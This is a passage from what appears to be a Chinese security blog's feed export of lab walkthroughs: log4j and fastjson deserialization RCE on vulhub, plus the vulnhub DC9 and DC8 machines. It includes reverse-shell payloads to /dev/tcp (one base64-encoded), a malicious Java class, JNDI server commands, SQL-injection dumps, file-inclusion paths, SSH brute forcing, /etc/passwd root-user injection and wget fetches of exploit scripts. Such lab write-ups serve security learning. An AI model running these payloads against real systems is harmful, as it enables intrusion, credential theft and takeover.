&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMjkvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; -A <span class="string">&quot;192.168.142.129&quot;</span></span><br></pre></td></tr></table></figure><p>-C是编码后的内容，-A是反弹shell的ip地址。<br>注意要先nc监听6666端口.</p><p><img src="../images/image-20230417195106656.png" alt="image-20230417195106656"></p><p>因为查出来的java版本是1.8</p><p>然后进行抓包发包</p><p><img src="../images/image-20230417200034238.png" alt="image-20230417200034238"></p><p>把生成的payload拿去打</p><p>然后就成功将shell反弹</p><p><img src="../images/image-20230417200109588.png" alt="image-20230417200109588"></p><p><img src="../images/image-20230417200310374.png" alt="image-20230417200310374"></p><h2 id="vulhub-log4j漏洞复现-CVE-2017-5645"><a href="#vulhub-log4j漏洞复现-CVE-2017-5645" class="headerlink" title="vulhub-log4j漏洞复现(CVE-2017-5645)"></a>vulhub-log4j漏洞复现(<a href="https://so.csdn.net/so/search?q=CVE&amp;spm=1001.2101.3001.7020">CVE</a>-2017-5645)</h2><h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h4><p>还是先利用docker搭建环境</p><p><img src="../images/image-20230417203312678.png" alt="image-20230417203312678"></p><p>搭建完毕</p><p>准备工具，这里用的是   <a href="https://github.com/frohoff/ysoserial">ysoserial</a></p><p>然后cd进入该目录，使用<code>mvn clean package -DskipTests</code>命令生成jar包</p><p><strong>这里话java版本换成java1.8_20 </strong>  和fastjson那个方法一样来设置java版本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java ‐jar ysoserial-v0<span class="number">.0</span><span class="number">.6</span>-all.jar CommonsCollections5 <span class="string">&quot;touch /tmp/success&quot;</span> | nc <span class="number">192.168</span><span class="number">.217</span><span class="number">.134</span> <span class="number">4712</span></span><br></pre></td></tr></table></figure><p>这里是往/tmp命令里写入success文件，</p><p><a href="https://blog.csdn.net/qq_51295677/article/details/125703978">复现文章，接下来我就不写了</a></p><p>因为不知道哪个ip开启了4712端口</p>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub log4j 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulhub-fastjson漏洞复现</title>
      <link href="/posts/5a844f8c.html"/>
      <url>/posts/5a844f8c.html</url>
      
        <content type="html"><![CDATA[<p><img src="../images/image-20230417145033021.png" alt="image-20230417145033021"></p><p>先了解一下着几个等会复现需要用到的东西</p><p><a href="https://cloud.tencent.com/developer/article/1974944">干货｜最全fastjson漏洞复现与绕过</a></p><h2 id="CVE-2017-18349即Fastjson1-2-24-反序列化漏洞RCE"><a href="#CVE-2017-18349即Fastjson1-2-24-反序列化漏洞RCE" class="headerlink" title="CVE-2017-18349即Fastjson1.2.24 反序列化漏洞RCE"></a>CVE-2017-18349即Fastjson1.2.24 反序列化漏洞RCE</h2><p><strong>ubuntu:  靶机 </strong>   <strong>192.168.142.137</strong></p><p><strong>kali: 攻击机</strong>   <strong>192.168.142.129</strong></p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h4><p>fastjson在解析json对象时，会使用autoType实例化某一个具体的类，并调用set/get方法访问属性。漏洞出现在Fastjson autoType处理json对象时，没有对@type字段进行完整的安全性验证，我们可以传入危险的类并调用危险类连接远程RMI服务器，通过恶意类执行恶意代码，进而实现远程代码执行漏洞。</p><p>影响版本为 fastjson &lt; 1.2.25</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>首先进入fastjson 1.2.24的docker环境，使用<code>java -version</code>查看一下java的版本为1.8.0_102。因为java环境为102，没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，可以使用<code>com.sun.rowset.JdbcRowSetImpl</code>利用链结合JNDI注入执行远程命令</p><p><strong>安装javac环境，这里直接使用20版本替换102</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">curl http:<span class="comment">//www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz</span></span><br><span class="line">tar zxvf jdk-8u20-linux-x64.tar.gz</span><br><span class="line">rm -rf /usr/bin/java*</span><br><span class="line">ln -s /opt/jdk1<span class="number">.8</span><span class="number">.0_20</span>/bin/j* /usr/bin</span><br><span class="line">javac -version</span><br><span class="line">java -version</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417145253381.png" alt="image-20230417145253381"></p><p> 攻击机的java版本必须是<strong>java8</strong></p><p><strong>打开docker靶机</strong></p><p><img src="../images/image-20230417151012246.png" alt="image-20230417151012246"></p><p>编辑恶意类代码，起名为evilclass.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evilclass</span>&#123;</span><br><span class="line"><span class="keyword">static</span>&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/test&quot;</span>&#125;;</span><br><span class="line"><span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">pc.waitFor();</span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line"><span class="comment">// do nothing</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 <code>String[] commands</code>可以进行修改自己想要执行的命令。这里是在<code>/tmp</code>目录下创建一个<code>test</code>文件</p><p><strong>使用javac编译evilclass.java文件生成evilclass.class</strong></p><p><img src="../images/image-20230417152951359.png" alt="image-20230417152951359"></p><p>这里的化想要搭建一个RMI服务，首先下载marshalsec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mbechler/marshalsec.git</span><br></pre></td></tr></table></figure><p>安装maven并编译marshalsec生成jar</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install maven</span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417153908651.png" alt="image-20230417153908651"></p><p>我们进入到marshalsec的target目录里面进行查看已经生成了marshalsec-0.0.3.3-SNAPSHOT-all.jar，然后使用marshalsec搭建一个RMI服务器，这里的ip就是你攻击机的ip，端口可以随意</p><p>这里也可以使用启动<strong>LDAP</strong>服务，效果是一样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer<span class="string">&quot;http://192.168.1.8/#evilclass&quot;</span>9999java-cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer<span class="string">&quot;http://192.168.1.8/#evilclass&quot;</span><span class="number">9999</span></span><br></pre></td></tr></table></figure><p>这里的IP是攻击机ip,端口随意</p><p>这里我们使用<strong>RMI</strong>服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://192.168.142.129：8000/#evilclass&quot;</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417155734179.png" alt="image-20230417155734179"></p><p>先开启一个python服务来进行文件的上传，如何RMI使用的是python的8000端口</p><p><img src="../images/image-20230417155831781.png" alt="image-20230417155831781"></p><p>开启RMI服务</p><p><img src="../images/image-20230417155903891.png" alt="image-20230417155903891"></p><p>抓包进行发包</p><p>如何就会发现成功了</p><p><img src="../images/image-20230417155934820.png" alt="image-20230417155934820"></p><p><img src="../images/image-20230417160000493.png" alt="image-20230417160000493"></p><p><img src="../images/image-20230417160023376.png" alt="image-20230417160023376"></p><p>这里就和刚开始的时候evilclass.java里写的一样了，就是往/tmp目录里写一个test文件</p><p>如果要反弹shell的化，只需要修改commands里的内容就行了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evilclass</span>&#123;</span><br><span class="line"><span class="keyword">static</span>&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.142.129/9001 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line"><span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">pc.waitFor();</span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line"><span class="comment">// do nothing</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417160907087.png" alt="image-20230417160907087"></p><p>成功将shell反弹</p><p>fastjson的漏洞复现的话都是这个方向，或者修改<code>com.sun.rowset.JdbcRowSetImpl</code>这些东西，其他的就不进行复现了</p><p>下面就是参考链接了  其他不懂的版本可以进行查看</p><p><a href="https://cloud.tencent.com/developer/article/1974944">干货｜最全fastjson漏洞复现与绕过</a></p><p><a href="https://www.freebuf.com/vuls/276812.html">Fastjson漏洞复现笔记</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC9</title>
      <link href="/posts/b398db55.html"/>
      <url>/posts/b398db55.html</url>
      
        <content type="html"><![CDATA[<p><strong>总结：<a href="https://so.csdn.net/so/search?q=sql注入&amp;spm=1001.2101.3001.7020">sql注入</a>，端口敲门，覆盖passwd提权</strong></p><p>先扫一下c段</p><p><img src="../images/image-20230414173216143.png" alt="image-20230414173216143"></p><p>发现主机，然后进行端口扫描</p><p><img src="../images/image-20230414173411019.png" alt="image-20230414173411019"></p><p>还是着两个常规端口</p><p><img src="../images/image-20230414173519934.png" alt="image-20230414173519934"></p><p>这就是上面state的解释</p><p>简单来说就是不知道22端口是开的还是关的</p><p>于是我们就去尝试一下访问80端口</p><p><img src="../images/image-20230414173658881.png" alt="image-20230414173658881"></p><p>发现一个网站，但是不是一个cms</p><p>于是我们就开始探索网站，看存在哪些可以利用的地方</p><p><img src="../images/image-20230414173849111.png" alt="image-20230414173849111"></p><p><img src="../images/image-20230414173859531.png" alt="image-20230414173859531"></p><p>上面的sql语句会把下面的内容给爆出来，所以就是说这个地方存在sql漏洞，那么我们就可以进行sqlmap查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.10/results.php&quot; --data &quot;search=1&quot; --dbs --batch</span><br><span class="line">sqlmap -u &quot;http://192.168.1.10/results.php&quot; --data &quot;search=1&quot; -D &quot;Staff&quot; --tables --dbs --batch</span><br><span class="line">sqlmap -u &quot;http://192.168.1.10/results.php&quot; --data &quot;search=1&quot; -D &quot;Staff&quot; -T &quot;Users&quot; --columns --dbs --batch</span><br><span class="line">sqlmap -u &quot;http://192.168.142.136/results.php&quot; --data &quot;search=1&quot; -D &quot;Staff&quot; -T &quot;Users&quot; -C &quot;Username&quot;,&quot;Password&quot; --dump --dbs</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414174311321.png" alt="image-20230414174311321"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里我们就得到了admin的密码了</span><br><span class="line"></span><br><span class="line">admin:transorbital1</span><br></pre></td></tr></table></figure><p>然后进行登录</p><p><img src="../images/image-20230414174618993.png" alt="image-20230414174618993"></p><p>成功进行登录</p><p><strong>文件包含</strong></p><p>有个提示：<code>File does not exist</code> 显示文件不存在 通过测试 发现 可能是文件包含漏洞发现这里得用户和刚刚数据库里的用户有些一样的</p><p><img src="../images/image-20230414174903776.png" alt="image-20230414174903776"></p><p>成功读取，说明这里存在文件包含</p><p><img src="../images/image-20230414175012672.png" alt="image-20230414175012672"></p><p>这里知道不少用户的账号， 而且都是/bin/bash,但是说22端口不知道是有没有开启的，然后吧，咱们又不知道干什么了。看看其他人的，这里我们就知道要去查看linux中的任务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//查看linux的任务</span><br><span class="line">http://靶机ip/welcome.php?file=../../../../../../proc/sched_debug</span><br></pre></td></tr></table></figure><p> 这里因为太乱了没有排序，这里教给大家一个好方法，这里直接ctrl+u直接查看源代码，他就会自动给我们排列了。</p><p><img src="../images/image-20230414175829926.png" alt="image-20230414175829926"></p><p>这里发现了这个knockd服务</p><p>然后我们就去查看他的配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://靶机ip/welcome.php?file=../../../../../../etc/knockd.conf</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414175946047.png" alt="image-20230414175946047"></p><p>那么这里就涉及到一个新的知识点了</p><h3 id="端口敲门"><a href="#端口敲门" class="headerlink" title="端口敲门"></a>端口敲门</h3><p>这里分析一下这个配置文件，在按循序访问了这个三个端口，linux防火墙就不会防我们了，iptables就是linux设置防火墙的命令，这里给大家推荐一个博客，看完也就理解端口敲门是用来看什么的了<a href="https://blog.csdn.net/m0_65129142/article/details/121993950">Web端口敲门的奇思妙想</a>    <a href="https://zhuanlan.zhihu.com/p/59488488">端口敲门</a></p><p>所以<strong>敲门密码</strong>我们从哪获取呢，就是通过访问<strong>knock服务的配置文件</strong>，然后从中获取</p><p><img src="../images/image-20230414181653673.png" alt="image-20230414181653673"></p><p>配置文件中给我们提供了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS 靶机ip -p 7469</span><br><span class="line">nmap -sS 靶机ip -p 8475</span><br><span class="line">nmap -sS 靶机ip -p 9842</span><br><span class="line"></span><br><span class="line">//这里有一个工具也是可以的，但是感觉很慢</span><br><span class="line">//没有需要自己下，apt install knockd</span><br><span class="line">knock 靶机ip 7469 8475 9842</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414181856542.png" alt="image-20230414181856542"></p><p>发现ssh端口成功打开</p><p>利用sqlmap查到的全部用户名和密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.136/results.php&quot; --data &quot;search=1&quot; -D users -T UserDetails --dump</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414182229536.png" alt="image-20230414182229536"></p><p>于是进行ssh爆破，利用之前用到的工具，<code>hydra</code></p><p>因为不知道哪些用户能进行ssh登录</p><p>发现了三个用户分别是 <code>joeyt Passw0rd</code> 和<code>janitor Ilovepeepee</code> 和<code>chandlerb UrAG0d</code></p><p><img src="../images/image-20230414183153111.png" alt="image-20230414183153111"></p><p>使用命令：<code>ssh joeyt@192.168.142.136</code> （这里ip自动获取了不用在意一样的）等三个用户都进行登入看看有没有什么隐藏的信息</p><p><img src="../images/image-20230414183205288.png" alt="image-20230414183205288"></p><p><img src="../images/image-20230414183129965.png" alt="image-20230414183129965"></p><p><img src="../images/image-20230414183411763.png" alt="image-20230414183411763"></p><p>发现存在一个密码，那么我们就拿这些密码添加到用来爆破的字典里，看还能不能再爆破出来一些可登录的账号密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt ssh://192.168.142.136</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414183714258.png" alt="image-20230414183714258"></p><p>发现一个新账号  于是进行登录</p><p><img src="../images/image-20230414183837607.png" alt="image-20230414183837607"></p><p>登录成功  </p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>还是老三样  </p><p>suid <code>sudo -l</code>  内核提权</p><p><img src="../images/image-20230414183955956.png" alt="image-20230414183955956"></p><p>访问这个目录进行查看这是什么东西</p><p><img src="../images/image-20230414184127144.png" alt="image-20230414184127144"></p><p>发现这个<code>test</code>是一个<code>python</code>文件</p><p>那么我们就得去找这个<code>test.py</code>文件</p><p>看看他为什么能进行提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用命令：find / -name test.py 2&gt;/dev/null 查找python文件 进行查看</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414200337779.png" alt="image-20230414200337779"></p><p>发现这个test.py文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大概的就是将参数<code>1</code>的内容写到参数<code>2</code>中然后生成一个用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//使用openssl命令</span><br><span class="line">openssl passwd -1 -salt hahaha 123456</span><br><span class="line">生成$1$hahaha$hSxFjZSHRoiEn4DYrrGUI.</span><br><span class="line"> </span><br><span class="line">//因为没有权限先来到tmp</span><br><span class="line">echo &#x27;hahaha:$1$hahaha$hSxFjZSHRoiEn4DYrrGUI.:0:0::/root/:/bin/bash&#x27; &gt;&gt; passwd</span><br><span class="line"> </span><br><span class="line">//这里使用test</span><br><span class="line">sudo /opt/devstuff/dist/test/test passwd /etc/passwd</span><br><span class="line">//这里执行的test.py是 将/tmp下的用户添加到/etc/passwd下</span><br><span class="line"> </span><br><span class="line">//然后替换到hahaha用户，密码123456</span><br><span class="line">su hahaha</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/minioesina/article/details/88145581?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-88145581-blog-54884976.235^v29^pc_relevant_default_base3&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3">openssl命令的解释</a></p><p><img src="../images/image-20230414204810615.png" alt="image-20230414204810615"></p><p><img src="../images/image-20230414205017910.png" alt="image-20230414205017910"></p><p><strong>④：就是/etc/passwd 的格式 这个不了解的话最好一步提权很容易错的</strong><br><strong>格式：用户名：密码：UID（用户ID）：GID（组ID）：描述性信息：主目录：默认Shell</strong><br><strong>（”x” 表示此用户设有密码，但不是真正的密码，真正的密码保存在 /etc/shadow 文件中</strong><br><strong>允许登入的shell就是/bin/bash禁止shell登入就是/sbin/nologin）</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub DC9 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC8</title>
      <link href="/posts/c49febc3.html"/>
      <url>/posts/c49febc3.html</url>
      
        <content type="html"><![CDATA[<p><strong>总结：exim4<a href="https://so.csdn.net/so/search?q=提权&amp;spm=1001.2101.3001.7020">提权</a></strong></p><p>先扫一下c段，找一下靶机</p><p><img src="../images/image-20230414150131729.png" alt="image-20230414150131729"></p><p>接下来扫一下端口，看开放了哪些端口</p><p><img src="../images/image-20230414150444248.png" alt="image-20230414150444248"></p><p>发现存在了两个端口  80 和 22</p><p>访问80端口</p><p><img src="../images/image-20230414150611475.png" alt="image-20230414150611475"></p><p>还是老样子，还是这个cms</p><p>这个版本的话很像存在漏洞的样子</p><p><strong>Droopescan是一款基于插件的扫描器，可帮助安全研究人员发现Drupal，SilverStripe，Wordpress，Joomla（枚举版本信息和可利用URL地址）和Moodle的问题。</strong></p><p>学习一下这一款工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/droope/droopescan.git</span><br><span class="line"></span><br><span class="line">cd droopescan</span><br><span class="line"></span><br><span class="line">pip install -r requirements.txt</span><br><span class="line"></span><br><span class="line">./droopescan scan --help</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用工具<code>droopescan</code>扫一下后台（因为也是第一次使用所以也是学习了一下）后台地址： <code>192.168.0.104/user/login</code>我们还是先看下网站有没有漏洞先</p><p><strong>这里也可以使用 使用别的扫描工具进行扫描，效果是一样的</strong></p><p><img src="../images/image-20230414150751373.png" alt="image-20230414150751373"></p><p>发现存在类似sql注入的感觉，拿sqlmap来进行尝试一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.142.135/?nid=1 --dbs #列出数据库</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414151758412.png" alt="image-20230414151758412"></p><p>发现两个数据库</p><p>然后查看表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.142.135?nid=1 -D d7db --tables  #列出数据库的表</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414152033676.png" alt="image-20230414152033676"></p><p>查出一堆表名，接下来就是查列名了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.142.135?nid=1 -D d7db -T users --columns #列出字段</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414152151409.png" alt="image-20230414152151409"></p><p>然后开始进行数据的查看了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.142.135?nid=1 -D d7db -T users -C name,pass -dump #列出账号和密码</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414152515057.png" alt="image-20230414152515057"></p><p>发现是进行密码加密后的</p><p>于是尝试进行破解  (<strong>这里估计只能进行john破解，admin的话，字典里可能没有</strong>)</p><p><img src="../images/image-20230414152838028.png" alt="image-20230414152838028"></p><p>爆出密码，于是尝试进行登录</p><p><img src="../images/image-20230414152925308.png" alt="image-20230414152925308"></p><p>成功登录john用户</p><p>发现<code>Content</code>-&gt;点击<code>edit</code>-&gt;点击<code>WEBFORMS</code>-&gt;点击<code>Form settings</code>-&gt;点击下拉框选择<code>PHP code</code></p><p>这里可以写文件进行上传</p><p><img src="../images/image-20230414153441690.png" alt="image-20230414153441690"></p><p>发现shell反弹成功</p><p><strong>(这里能反弹成功是因为在提交contact us成功后会弹出一个一个html页面内容，然后我们在里面修改为phpcode，并且内容添加了shell，所以就能反弹成功)</strong></p><p>python shell交互</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>接下来就是提权了</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>还是利用这几个方法  suid sudo 内核提权</p><p><strong>sudo -l 找不到东西</strong></p><p>尝试一下suid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414154016149.png" alt="image-20230414154016149"></p><p>发现一个新东西，于是就看下他可不可以进行提权</p><p>找到一个exim4命令，exim是一款在<strong>Unix系统上使用的邮件服务</strong>，exim4在使用时具有root权限</p><p>于是就去<code>searchsploit</code>查找一下看他有没有漏洞</p><p><img src="../images/image-20230414154330691.png" alt="image-20230414154330691"></p><p>发现存在本地提权漏洞</p><p>但是不知道是哪个版本，于是就去所属目录进行查看</p><p><img src="../images/image-20230414154735143.png" alt="image-20230414154735143"></p><p>发现版本，于是就去读取<code>searchsplot</code>给的文件内容</p><p><img src="../images/image-20230414155000270.png" alt="image-20230414155000270"></p><p>然后把<code>46996.sh</code>拷贝到本地并改名为<code>666.sh</code>，并在kali开启http服务 <code>service apache2 start</code></p><p>这里开启服务的原因是为了能把本地的提权文件上传到目标服务器上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">我们创建网站，然后这里我们可以使用wget上传，这里有两种方法可以使用</span><br><span class="line"></span><br><span class="line">1.可以使用python创建临时网站</span><br><span class="line"></span><br><span class="line">2.使用Apache之类的</span><br><span class="line"></span><br><span class="line">因为我们这里有apache就不使用python了。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//将exp直接复制到，网站根目录下面</span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/46996.sh /var/www/html/1.sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//这里我们来到/tmp目录下面，因为其他目录通常会没有权限</span><br><span class="line">//然后wget下载,这里要看自己的ip和文件名</span><br><span class="line">wget http://192.168.1.12/1.sh</span><br><span class="line"> </span><br><span class="line">//给权限</span><br><span class="line">chmod 777 1.sh </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414160151191.png" alt="image-20230414160151191"></p><p>上传成功</p><p>然后查看文件，根据文件里的方法进行提权</p><p><img src="../images/image-20230414160501356.png" alt="image-20230414160501356"></p><p>发现上面的不行后，我们换另一种方法</p><p>文件里有好几种方法，可以自己进行查看</p><p><img src="../images/image-20230414160717547.png" alt="image-20230414160717547"></p><p><img src="../images/image-20230414160818299.png" alt="image-20230414160818299"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span 